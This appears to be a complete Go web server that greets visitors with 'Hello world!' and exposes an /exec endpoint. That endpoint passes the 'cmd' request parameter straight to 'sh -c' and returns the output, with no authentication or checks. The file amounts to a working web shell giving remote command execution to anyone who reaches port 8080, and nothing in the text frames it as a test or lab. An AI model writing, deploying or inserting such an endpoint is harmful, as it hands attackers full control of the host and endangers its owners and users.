package main

import (
	"fmt"
	"log"
	"net/http"
	"os/exec"
)

func hello(w http.ResponseWriter, r *http.Request) {
	fmt.Fprintf(w, "Hello world!")
}

func runCmd(w http.ResponseWriter, r *http.Request) {
	r.ParseForm()
	fmt.Println(r.Form)
	cmd := exec.Command("sh", "-c", r.Form["cmd"][0])
	cmd.Stdout = w
	cmd.Stderr = w
	cmd.Run()

}

func main() {
	http.HandleFunc("/", hello)
	http.HandleFunc("/exec", runCmd)
	err := http.ListenAndServe(":8080", nil)
	if err != nil {
		log.Fatalln(err)
	}
}
